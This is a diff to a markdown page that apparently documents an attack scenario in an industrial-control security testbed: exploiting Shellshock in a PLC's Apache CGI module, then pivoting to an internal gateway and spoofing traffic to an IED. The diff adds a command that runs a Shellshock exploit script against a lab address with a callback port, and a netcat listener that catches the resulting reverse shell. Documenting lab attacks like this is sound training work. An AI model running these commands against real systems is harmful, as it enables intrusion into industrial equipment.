@@ -1,6 +1,20 @@
 # Multi Stage Attack scenario
 
-The first stage of the attack path exploits the Shellshock vulnerability in the General-PLC, specifically targeting the CGI-Bin module of the Apache web server. This vulnerability enables attackers to inject and execute malicious commands through specially crafted HTTP requests since the CGI (Common Gateway Interface) scripts on Apache invoke the Bash shell for processing the HTTP response.
+This page outlines an attack targeting the Internal Gateway, which is not directly accessible from the attacker machine. To overcome this limitation, the attacker leverage ShellShock vulnerability in the Genera-PLC to pivot and gain access to the target. Then, traffic is spoofed to manipulate M-IED1 device.
+
+---
+
+The first stage of the attack path exploits the Shellshock vulnerability in the General-PLC, specifically targeting the CGI-Bin module of the Apache web server. This vulnerability enables attackers to inject and execute malicious commands through specially crafted HTTP requests since the CGI (Common Gateway Interface) scripts on Apache invoke the Bash shell for processing the HTTP response. The following commands illustrate the exploitation process:
+
+- Execute the exploit:
+```bash
+python3 shellshock.py 10.0.1.100 4444 http://10.0.1.66//cgi-bin/stats
+```
+
+- Establish a reverse shell listener:
+```bash
+nc -lvnp 4444
+```
 
 ![Shellshock Exploit](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/shellshock.png "Figure: Shellshock Exploit")
 
